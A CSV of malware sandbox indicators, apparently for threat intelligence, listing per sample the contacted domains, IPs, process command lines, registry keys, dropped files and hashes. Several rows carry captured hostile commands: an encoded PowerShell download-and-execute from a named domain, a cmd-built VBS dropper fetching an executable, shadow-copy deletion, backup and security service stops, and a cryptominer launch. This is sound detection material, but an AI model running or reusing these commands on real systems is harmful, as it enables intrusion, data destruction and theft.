file_name,Value,Address_Value,PID,Name,Parent_PID,File_Name,Command_Line,Current_Directory,Path,Full_Path,File_Path,Device_Path,File_Extension,Key,Hive,Data,Datatype,Display_Name,Service_Type,Startup_Command_Line,Startup_Type,Simple_Hash_Value,Type,Hostname_Value,Layer7_Protocol,Port_Value,Layer4_Protocol,Properties
04ad737a6336.xml,zaratoons.info,212.73.150.207,2880,ApplicationBase,2880,powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" powershell -EncodedCommand JABwAGEAdABoACAAPQAgACcALwBmAGEAeAAuAHAAaABwAD8AaQBkAD0AYQBkAG0AaQBuACcAOwAgACQAaABvAHMAdABuAGEAbQBlACAAPQAgACcAegBhAHIAYQB0AG8AbwBuAHMALgBpAG4AZgBvACcAOwAgAEkAJwAnAEUAJwAnAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AJwAgACsAIAAkAGgAbwBzAHQAbgBhAG0AZQAgACsAIAAkAHAAYQB0AGgAKQA7AA==",C:\Windows\system32\,c:\windows\system32\windowspowershell\v1.0\powershell.exe,conout$,windows\system32\windowspowershell\v1.0\getevent.types.ps1xml,c:\,ps1xml,Software\Microsoft\PowerShell\1\PowerShellEngine,HKEY_LOCAL_MACHINE,,,,,,,,,,,,,
068ee14069f2.xml,mzrevenge.ga,128.127.106.29,2908,ApplicationBase,2940,cmd.exe,"""C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\aUsMWsjhpLkBV4ai.exe"" ",C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\,c:\windows\syswow64\cmd.exe,,,,,Software\Microsoft\PowerShell\1\PowerShellEngine,HKEY_LOCAL_MACHINE,1,REG_DWORD_LITTLE_ENDIAN,,,,,,,,,,,
08fc0df9273e.xml,robotrade.com.vn,103.74.123.3,2432,DbgJITDebugLaunchSetting,2692,vbc.exe,"""{path}""",C:\Windows\system32\,c:\windows\microsoft.net\framework\v2.0.50727\vbc.exe,,,,,Software\Microsoft\.NETFramework,HKEY_CURRENT_USER,,,,,,,,,,,,,
1f8feaadbc49.xml,,,2376,DisableUNCCheck,2376,cmd.exe,"""C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\whzqnu.exe"" ",C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\,c:\windows\syswow64\cmd.exe,STD_OUTPUT_HANDLE,boot\bcd.log,c:\,txt,Software\Microsoft\Command Processor,HKEY_CURRENT_USER,,,,,,,,,,,,,
2019-snatch-ransomware.xml,,,2252,SystemStartOptions,820,vssadmin.exe,vssadmin delete shadows /all /quiet,C:\Windows\system32\,c:\windows\syswow64\vssadmin.exe,,,,,SYSTEM\CurrentControlSet\Control,HKEY_LOCAL_MACHINE,Service,REG_SZ,This service make backup copy every day,SERVICE_WIN32_OWN_PROCESS,C:\Users\aETAdzjz\Desktop\snatch-d0ddc221.vir.exe is auto-started,SERVICE_AUTO_START,,,,,,,
233767c999cb.xml,,,2532,key2,1544,233767c999cb351c19f993039552a3be754cc0bb87304ab50b74433015b08316.exe,"""C:\Users\EEBsYm5\Desktop\233767c999cb351c19f993039552a3be754cc0bb87304ab50b74433015b08316.exe"" ",C:\Users\EEBsYm5\Desktop\,c:\users\eebsym5\desktop\233767c999cb351c19f993039552a3be754cc0bb87304ab50b74433015b08316.exe,c:\users\all users\package cache\{13a4ee12-23ea-3371-91ee-efb36ddfff3e}v12.0.21005\packages\vcruntimeminimum_x86\18118810.gqkyo,users\all users\package cache\{13a4ee12-23ea-3371-91ee-efb36ddfff3e}v12.0.21005\packages\vcruntimeminimum_x86\18118810.gqkyo,c:\,txt,SOFTWARE\AppDataLow\Software\,HKEY_CURRENT_USER,BgIAAACkAABSU0ExAAQAAAEAAQAHKAWXCKQYidApAAfY3ZkxYnoiTvokaNYzMFedPRDdlc6gtHAbL6JH5L4E4tam5sAPnAm7gsyuSnDRwnlmfutwuPuBZSonphttXXvG2BpnxwBMyHsKdyIcoChIV1LMuWqIgI0uCRUb1nOVY+KRoq3Otoi1Cm99Il584v5nmY2j7g==,REG_SZ,,,,,3d4e3b1f72e8c25008dd88ad2c93581b,MD5,,,,,
263cf261a45e.xml,www.fuente-ovejuna.cz,156.67.210.210,3692,Timeout,484,cscript.exe,"""C:\Windows\System32\CScript.exe""  ""C:\Users\CIIHMN~1\Desktop\PAQUET~1.JS"" ",C:\Windows\system32\,c:\windows\system32\cscript.exe,STD_OUTPUT_HANDLE,Users\CIiHmnxMn6Ps\AppData\Local\nzpnpqiti\86976.exe,c:\,exe,Software\Microsoft\Windows Script Host\Settings,HKEY_LOCAL_MACHINE,"""C:\Users\CIiHmnxMn6Ps\AppData\Local\Relatorio_Erros\svchost.exe""",REG_SZ,,,,,f612bccf909dbc5bbf1779d44a9ca045,MD5,www.wkc.co.id,HTTP,443,,
2c5729e17b64.xml,i86h.com,217.182.53.69,2308,ApplicationBase,1532,cmd_.exe,"""C:\Program Files\Adobe\Reader 8.0.0\Reader\AcroRd32.exe""",C:\Users\BMe1N39jU1 6criBQ\Documents\,c:\program files\adobe\reader 8.0.0\reader\acrord32.exe,STD_OUTPUT_HANDLE,users\bme1n39ju1 6cribq\appdata\roaming\intel\sign.bin,c:\,ps1xml,Software\Microsoft\PowerShell\1\PowerShellEngine,HKEY_LOCAL_MACHINE,C:\Users\BME1N3~1\AppData\Local\Temp\cmd_.exe -a,REG_SZ,,,,,,,i86h.com,HTTP,80,,
303ad8c115d9.xml,ron4law.com,50.87.144.227,2492,Client,1112,cmd.exe, ,C:\Windows\system32\,c:\windows\system32\cmd.exe,STD_INPUT_HANDLE,windows\system32\c_1252.nls,c:\,dll,Software\AppDataLow\Software\Microsoft\3632F5D8-1D04-D8B6-57CA-A18C7B9E6580,HKEY_CLASSES_ROOT,"rundll32 ""C:\Users\aETAdzjz\AppData\Roaming\Microsoft\Crypore6\bdeskmgr.dll""",REG_BINARY,,,,,,,,,,,
329b3ddbf1c0.xml,www.kakaocorp.link,185.52.2.154,3788,Domain,1404,rlxsbp.exe,"""C:\Users\CIiHmnxMn6Ps\Desktop\rlxsbp.exe"" ",C:\Users\CIiHmnxMn6Ps\Desktop\,c:\users\ciihmnxmn6ps\desktop\rlxsbp.exe,c:\users\ciihmnxmn6ps\appdata\roaming\mozilla\firefox\profiles\8i341t8m.default\gmp-gmpopenh264\1.6\gmpopenh264.info.sfrpesivt,users\ciihmnxmn6ps\appdata\roaming\mozilla\firefox\profiles\8i341t8m.default\gmp-gmpopenh264\1.6\gmpopenh264.info.sfrpesivt,c:\,sfrpesivt,Keyboard Layout\Preload,HKEY_LOCAL_MACHINE,,,,,,,,,www.kakaocorp.link,HTTP,80,,
32f7a9e9e50f.xml,google.com,172.217.23.142,1224,svchost.exe,472,svchost.exe,C:\ProgramData\VWcUEoYI\ssYIYkgc.exe,C:\Windows\system32\,c:\windows\system32\svchost.exe,,,,,software\microsoft\windows\currentversion\run,HKEY_LOCAL_MACHINE,C:\ProgramData\GSogosQc\YMIIsQMA.exe,REG_SZ,lMMYIkPL,SERVICE_WIN32_OWN_PROCESS,C:\ProgramData\VWcUEoYI\ssYIYkgc.exe,SERVICE_AUTO_START,,,google.com,HTTP,80,TCP,
3692f99b7666.xml,icanhazip.com,46.173.218.240,2236,ApplicationBase,1640,cmd.exe,''46.173.218.240'',C:\Windows\system32\,c:\windows\syswow64\cmd.exe,STD_OUTPUT_HANDLE,windows\syswow64\windowspowershell\v1.0\getevent.types.ps1xml,c:\,ps1xml,Software\Microsoft\VBA\7.1\Common,HKEY_LOCAL_MACHINE,0,REG_SZ,,,,,,,icanhazip.com,HTTP,80,TCP,
43e67197f480.xml,,,3132,BrowserUpdateCheck,1288,svhost.exe,"""C:\Users\CIiHmnxMn6Ps\Desktop\svhost.exe"" ",C:\Users\CIiHmnxMn6Ps\Desktop\,c:\users\ciihmnxmn6ps\desktop\svhost.exe,c:\users\ciihmnxmn6ps\appdata\local\iconcache.db.ox4444,users\ciihmnxmn6ps\appdata\local\iconcache.db.ox4444,c:\,ox4444,Software\Microsoft\Windows\CurrentVersion\RunOnce,HKEY_CURRENT_USER,C:\Users\CIiHmnxMn6Ps\AppData\Local\svhost.exe,REG_SZ,,,,,,,,,,,
49a56e067a73.xml,raw.githubusercontent.com,151.101.12.133,4452,1668818982,1376,brjujs.exe,"""C:\Users\FD1HVy\Desktop\brjujs.exe"" ",C:\Users\FD1HVy\Desktop\,c:\users\fd1hvy\desktop\brjujs.exe,,,,,SOFTWARE\Microsoft\Windows NT\CurrentVersion,HKEY_LOCAL_MACHINE,,,,,,,,,,,,,
4b12f4fdf07d.xml,,,2124,sc.exe,2000,sc.exe,"""C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\lok.exe"" ",C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\,c:\windows\system32\sc.exe,,,,,SOFTWARE\Microsoft\Windows NT\CurrentVersion,HKEY_LOCAL_MACHINE,"""C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\lok.exe""",REG_SZ,,,,,,,,,,,
4e38fd97f1d6.xml,smtp.yandex.ru,213.180.204.38,2704,Email,2144,nrpswgral.exe,"""C:\Users\FD1HVy\Desktop\nrpswgral.exe"" ",C:\Users\FD1HVy\Desktop\,c:\users\fd1hvy\desktop\nrpswgral.exe,c:\windows\microsoft.net\framework\v4.0.30319\config\machine.config,windows\microsoft.net\framework\v4.0.30319\config\machine.config,c:\,ini,SOFTWARE\Microsoft\.NETFramework\v4.0.30319,HKEY_LOCAL_MACHINE,,,,,,,,,,,,,
4ef2c020a2f4.xml,www.sgnaturn.com,198.54.121.5,2284,DisableUNCCheck,924,cmd.exe,"""C:\Windows\System32\cmd.exe"" /c CD %temp% & @echo set H2hA8cL7vV6cF1uZ5hR8wN6sP3aV6cG1c = createobject(""wscript.shell"") >ZMXZAA.vBS & @echo Dim X3eH5tN6kV3tX2yS6cM8qZ5iV1oB0aR0nN5pF1kR1kJ7x >>ZMXZAA.vBS & @echo Dim R2qL4oI3mN2vD9iQ1sX7cY9oA0fK0hS7dL1w >>ZMXZAA.vBS & @echo Dim B8yU2nW4oD3lW4vO1xP2nY9oR3e >>ZMXZAA.vBS & @echo Dim N9nY8xU9gT0oC0bB7aN5wT8qV8rR9bT6yV2iA5oO8eL7rF2jF6mY8zG3fG0i >>ZMXZAA.vBS & @echo X3eH5tN6kV3tX2yS6cM8qZ5iV1oB0aR0nN5pF1kR1kJ7x = ""http://82.118.242.107/~able/1_ga/al/al.exe"" >>ZMXZAA.vBS & @echo R2qL4oI3mN2vD9iQ1sX7cY9oA0fK0hS7dL1w = ""JSTCHV.eXe"" >>ZMXZAA.vBS & @echo Set B8yU2nW4oD3lW4vO1xP2nY9oR3e = CreateObject(""MSXML2.XMLHTTP"") >>ZMXZAA.vBS & @echo B8yU2nW4oD3lW4vO1xP2nY9oR3e.Open ""GET""",C:\Windows\system32\,c:\windows\syswow64\cmd.exe,STD_INPUT_HANDLE,users\aetadzjz\appdata\local\temp\zmxzaa.vbs,\??\C:\,ini,Software\Microsoft\Internet Explorer\Main\FeatureControl,HKEY_LOCAL_MACHINE,C:\Program Files (x86)\Flpxdufw0\mskr8xjle.exe,REG_SZ,,,,,,,www.sgnaturn.com,HTTP,80,TCP,"
                "
53f7d917ad9e.xml,pilodirsob.com,5.188.60.53,2568,DisplayVersion,1112,cmd.exe,"cmd /C ""echo -------- >> C:\Users\aETAdzjz\AppData\Local\Temp\1D0E.bin1""",C:\Windows\system32\,c:\windows\system32\cmd.exe,STD_OUTPUT_HANDLE,users\aetadzjz\appdata\local\temp\1d0e.bin1,c:\,jpg,SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\{26A24AE4-039D-4CA4-87B4-2F03217071FF},HKEY_LOCAL_MACHINE,0,REG_BINARY,,,,,,,,,,,
540b64d8ff20.xml,api.ipify.org,107.22.251.25,3060,SMTP Server,1112,sjfhjjskfsf.exe,"""C:\Users\aETAdzjz\AppData\Roaming\appdata\sjfhjjskfsf.exe""",C:\Windows\system32\,c:\users\aetadzjz\appdata\roaming\appdata\sjfhjjskfsf.exe,,,,,Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676,HKEY_CURRENT_USER,,,,,,,,,,,,,
5d4e22be32dc.xml,www.vacanzaimmobiliare.it,185.81.4.56,2404,Email,1116,nqmdwcixbxs.exe,"""C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\nqmdwcixbxs.exe"" ",C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\,c:\users\5p5nrgjn0js halpmcxz\desktop\nqmdwcixbxs.exe,c:\windows\microsoft.net\framework\v2.0.50727\config\machine.config,windows\microsoft.net\framework\v2.0.50727\config\machine.config,c:\,ini,Software\Microsoft\Wbem\Scripting,HKEY_CURRENT_USER,C:\Users\5p5NrGJn0jS HALPmcxz\AppData\Roaming\Java\JavaUpdtr.exe,REG_SZ,,,,,,,,,,,
634ad02fba53.xml,google.com,,2136,Task Protect 2.3,1288,urkotu.exe,"""C:\Users\CIiHmnxMn6Ps\Desktop\urkotu.exe"" ",C:\Users\CIiHmnxMn6Ps\Desktop\,c:\users\ciihmnxmn6ps\desktop\urkotu.exe,c:\users\ciihmnxmn6ps\desktop\urkotu.exe,users\ciihmnxmn6ps\desktop\urkotu.exe,c:\,exe,Software\AppDataLow\Software\{2F917068-DC0D-ADE9-C564-77CBD67FE7B8}\11881FB1\e6577de29e95e38a02,HKEY_CURRENT_USER,3,REG_SZ,,,,,,,,,,,
695e211d206e.xml,api.db-ip.com,104.26.5.15,1996,ApplicationBase,4024,net.exe,"""C:\Users\FD1HVy\Desktop\yjpgfqu.exe"" ",C:\Users\FD1HVy\AppData\Local\Temp\,c:\windows\syswow64\net.exe,,,,,Software\Microsoft\PowerShell\3\PowerShellEngine,HKEY_LOCAL_MACHINE,NEMTY_D73IOGW,REG_SZ,,,,,,,,,,,
6d365f7901cd.xml,,,2720,IgnoreUserSettings,2808,hsbftstclaogdeeotf.exe,"""C:\Users\5P5NRG~1\AppData\Local\Temp\hSbFTsTClaogdEEotf.exe"" ",C:\Windows\system32\,c:\users\5p5nrg~1\appdata\local\temp\hsbftstclaogdeeotf.exe,STD_OUTPUT_HANDLE,users\5p5nrgjn0js halpmcxz\appdata\local\temp\tmp4ef.tmp,c:\,exe,Software\Microsoft\Windows Script Host\Settings,HKEY_LOCAL_MACHINE,C:\Program Files (x86)\IMAP Service\imapsv.exe,REG_SZ,,,,,f6cb9cb7189e5b3311511a09bf49bc60,MD5,,,,,"
                "
6e4cc242e9b4.xml,workharder.club,185.252.213.161,2788,DisplayName,1384,1.exe,"""C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\1.exe"" ",C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\,c:\users\5p5nrgjn0js halpmcxz\desktop\1.exe,STD_INPUT_HANDLE,users\5p5nrg~1\appdata\local\temp\209150999161799351040.tmp-wal,c:\,txt,Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676\00000003,HKEY_LOCAL_MACHINE,,,,,,,,,workharder.club,HTTP,80,,
72cca77c3813.xml,,,4288,Identifier,1376,mfo4ed9hfrpsso4o.exe,"""C:\Users\FD1HVy\Desktop\mFO4ED9hfrpsSO4O.exe"" ",C:\WINDOWS\system32\,c:\users\fd1hvy\desktop\mfo4ed9hfrpsso4o.exe,,,,,HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0,HKEY_USERS,,,,,,,,,,,,,
7ea94da41974.xml,jadema.com.py,192.185.73.158,2336,ApplicationBase,1120,Windows\SysWOW64\ntdll.dll,"""C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE"" /n",C:\Users\aETAdzjz\Desktop\,c:\users\aetadzjz\appdata\local\temp\62890218\fsk.exe,STD_INPUT_HANDLE,Windows\SysWOW64\ntdll.dll,\??\C:\,ini,Software\Microsoft\PowerShell\1\PowerShellEngine,HKEY_LOCAL_MACHINE,C:\Program Files (x86)\Lihhl\services3f4.exe,REG_SZ,,,,,,,jadema.com.py,HTTP,80,TCP,
81f1a5faaa79.xml,vdtogt.nl,74.141.205.116,2468,ApplicationBase,3080,aeroroyale.exe,"""C:\Users\BGC6u8Oy yXGxkR\AppData\Local\Microsoft\Windows\aeroroyale.exe""",C:\Users\BGC6u8Oy yXGxkR\Desktop\,c:\users\bgc6u8oy yxgxkr\appdata\local\microsoft\windows\aeroroyale.exe,STD_OUTPUT_HANDLE,windows\system32\windowspowershell\v1.0\dotnettypes.format.ps1xml,c:\,dat,Software\Microsoft\PowerShell\1\PowerShellEngine,HKEY_LOCAL_MACHINE,,,,,,,,,vdtogt.nl,HTTP,80,UDP,
8af0d99cef6f.xml,,,864,DisableUNCCheck,864,sc.exe,sc stop wscsvc,C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\,c:\windows\syswow64\sc.exe,,,,,Software\Microsoft\Internet Explorer\Main\FeatureControl,HKEY_CURRENT_USER,┢偁䑐呁╁浜瑨灯㈳楢⹴硥≥,REG_SZ,,,,,,,,,,,
8de41ace64ef.xml,tnaapparels.com,192.95.7.159,2424,UninstallString,1544,3838612080743901967.exe,"""C:\Users\EEBsYm5\Desktop\3838612080743901967.exe"" ",C:\Users\EEBsYm5\Desktop\,c:\users\eebsym5\desktop\3838612080743901967.exe,c:\users\eebsym5\appdata\local\temp\18144644.bat,users\eebsym5\appdata\local\temp\18144644.bat,c:\,dat,Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676\00000001,HKEY_LOCAL_MACHINE,,,,,,,3880eeb1c736d853eb13b44898b718ab,MD5,tnaapparels.com,HTTP,80,TCP,
93986d4e88a8.xml,supermen22.beget.tech,5.101.152.252,3600,DisplayName,1404,globalhack[rueunavn][17.02.2019] .exe,"""C:\Users\CIiHmnxMn6Ps\Desktop\GlobalHack[RUEUNAVN][17.02.2019] .exe"" ",C:\Users\CIiHmnxMn6Ps\Desktop\,c:\users\ciihmnxmn6ps\desktop\globalhack[rueunavn][17.02.2019] .exe,c:\users\ciihmnxmn6ps\appdata\roaming\mozilla\firefox\profiles\8i341t8m.default\cookies.sqlite,users\ciihmnxmn6ps\appdata\roaming\mozilla\firefox\profiles\8i341t8m.default\cookies.sqlite,c:\,txt,SOFTWARE\Microsoft\Cryptography,HKEY_LOCAL_MACHINE,,,,,,,,,supermen22.beget.tech,HTTP,80,,
9b86a50b36ae.xml,,,2076,net.exe,1884,net.exe,"""C:\Windows\System32\net.exe"" stop MSSQL$VEEAMSQL2008R2 /y",C:\Windows\system32\,c:\windows\system32\net.exe,STD_OUTPUT_HANDLE,users\public\sys,c:\,png,Software\Microsoft\Command Processor,HKEY_CURRENT_USER,C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\xhcdxx.exe,REG_SZ,,,,,,,,,,,
a14e514ddfc3.xml,185.222.202.79/sat36/YKYD69Q_W617601.2E664EE04488A02C628E0E6CA864C24A/5/spk/,64.44.51.87,2376,ApplicationBase,2116,cmd.exe,"""C:\Users\aETAdzjz\AppData\Local\Temp\fulezad.exe"" ",C:\Windows\system32\,c:\windows\syswow64\cmd.exe,STD_OUTPUT_HANDLE,windows\syswow64\ntdll.dll,c:\,ps1xml,Software\Microsoft\PowerShell\1\PowerShellEngine,HKEY_LOCAL_MACHINE,,,,,,,,,,HTTP,443,TCP,
a703dc8819dc.xml,,,4896,VbaCapability,1984,winword.exe,"""C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE"" /n",C:\Users\FD1HVy\Desktop\,c:\program files\microsoft office\root\office16\winword.exe,,,,,TypeLib\{00020905-0000-0000-C000-000000000046}\8.7\0,HKEY_CLASSES_ROOT,,,,,,,,,,,,,
b2946daf21b5.xml,rijschoolfastandserious.nl,127.0.0.1,4880,ApplicationBase,3648,explorer.exe,C:\WINDOWS\SysWOW64\explorer.exe,C:\WINDOWS\system32\,c:\windows\explorer.exe,,,,,Software\Microsoft\VBA\7.1\Common,HKEY_CLASSES_ROOT,,,,,,,,,,,,,
b365a249a15c.xml,xbr6lge984320911.notafiscal05.com,35.196.254.156,2800,userinit.exe,2712,userinit.exe,"""C:\Windows\System32\userinit.exe""",C:\Windows\system32\,c:\windows\system32\userinit.exe,c:\programdata\tempa\marxvxinhhmg.gif,programdata\tempa\marxvxinhhmg.gif,c:\,gif,Software\Microsoft\Command Processor,HKEY_LOCAL_MACHINE,,,,,,,,,xbr6lge984320911.notafiscal05.com,HTTP,80,,
bad-rabbit-ransomware-flash-analysis.xml,,192.168.0.0,1672,DisableUNCCheck,472,cmd.exe,\??\C:\Windows\system32\conhost.exe,C:\Windows\system32\,c:\windows\syswow64\cmd.exe,STD_OUTPUT_HANDLE,windows\infpub.dat,c:\,xml,Software\Microsoft\Command Processor,HKEY_LOCAL_MACHINE,1632268,REG_MULTI_SZ,Windows Client Side Caching DDriver,SERVICE_KERNEL_DRIVER,cscc.dat,SERVICE_BOOT_START,1d724f95c61f1055f0d02c2154bbccd3,MD5,,,445,TCP,
blackruby-ransomware.xml,freegeoip.net,104.31.11.172,2528,Global\.net clr networking,2528,svchost.exe,"""C:\Windows\System32\BlackRuby\Svchost.exe"" -o stratum+tcp://de01.supportxmr.com:3333 -u 43DmqxU4LzuTrmA8GLZ7S5J6w32bwCavX9bhvCiSEwwebfn4TCYRAxmPtWTZq9iQ1F6XYsktJEYBYDkhKu4KXw6rCCspxCJ -p EEBsYm5:CRH2YWU7",C:\Windows\system32\BlackRuby\,c:\windows\system32\blackruby\svchost.exe,,,,,SOFTWARE\Microsoft\BlackRuby,HKEY_LOCAL_MACHINE,Max,REG_SZ,,,,,,,freegeoip.net,HTTP,80,,
c2bd70495630.xml,,,2824,svchost.exe,444,svchost.exe,%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,C:\Windows\system32\,c:\windows\system32\svchost.exe,,,,,SOFTWARE\Microsoft\Cryptography,HKEY_LOCAL_MACHINE,,,,,,,,,,,,,
cc4e6e42f735.xml,connect-plus.co.uk,217.76.132.184,3040,ApplicationBase,3868,certmgr.exe,"""C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE"" /n",C:\Windows\system32\,c:\users\aetadzjz\appdata\local\msvcr100\certmgr.exe,,,,,Software\Microsoft\VBA\7.1\Common,HKEY_CURRENT_USER,"""C:\Users\aETAdzjz\AppData\Local\msvcr100\certmgr.exe""",REG_SZ,,,,,,,,,,,
cobalt-strike-beacon-hta-analysis.xml,LHnIwsj,13.32.218.187,1792,mshta.exe,3136,mshta.exe,"""C:\Windows\System32\mshta.exe""  ""C:\Users\CIIHMN~1\Desktop\SECURE~1.HTA"" ",C:\Windows\system32\,c:\windows\system32\mshta.exe,STD_OUTPUT_HANDLE,windows\cercf51.tmp,c:\,tmp,Software\Microsoft\Internet Explorer\ChakraRecycler,HKEY_LOCAL_MACHINE,,,,,,,d41d8cd98f00b204e9800998ecf8427e,MD5,dl6zxn23r8r14.cloudfront.net,HTTP,443,,
cryptowire-wanacry4-analysis.xml,blockchain.info/tobtc?currency=USD&value=1500,,2176,wanacr~1.exe,460,wanacr~1.exe,C:\PROGRA~1\COMMON~1\WANACR~1.EXE,C:\Windows\system32\,c:\progra~1\common~1\wanacr~1.exe,STD_OUTPUT_HANDLE,users\5jghkoaofdp\desktop\wanacry6.malware.exe,c:\,mp3,Software\Microsoft\Command Processor,INVALID,,,,,,,ec1abca3d8d1cf4cb5fe6cff5b19930c,MD5,blockchain.info,HTTP,443,,
d45dfa191469.xml,239.255.255.250,208.86.13.216,3704,svchost.exe,484,svchost.exe,"""C:\Windows\SysWOW64\indexerneutral.exe""",C:\Windows\system32\,c:\windows\system32\svchost.exe,STD_INPUT_HANDLE,windows\syswow64\eulacompile.exe,c:\,exe,interface\{aa5b6a80-b834-11d0-932f-00a0c90dcaa9},HKEY_CURRENT_USER,,,indexerneutral,SERVICE_WIN32_OWN_PROCESS,"""C:\Windows\SysWOW64\indexerneutral.exe""",SERVICE_AUTO_START,,,,HTTP,443,UDP,
d77378dcc42b.xml,www.macartegrise.eu,52.29.192.136,2556,1,1452,o.exe,"""C:\Users\EEBsYm5\Desktop\o.exe"" ",C:\Users\EEBsYm5\Desktop\,c:\users\eebsym5\desktop\o.exe,c:\documents and settings\ibagx-decrypt.html,documents and settings\ibagx-decrypt.html,c:\,html,Keyboard Layout\Preload,HKEY_CURRENT_USER,,,,,,,,,﻿www.billerimpex.com,HTTP,80,,
de4224eca5ac.xml,www.google.com,172.217.21.196,3332,InstallationType,1376,compito italiano.doc.exe,"""C:\Users\FD1HVy\Desktop\compito italiano.doc.exe"" ",C:\Users\FD1HVy\Desktop\,c:\users\fd1hvy\desktop\compito italiano.doc.exe,,,,,SOFTWARE\Microsoft\.NETFramework\v4.0.30319,HKEY_LOCAL_MACHINE,,,,,,,,,,,,,
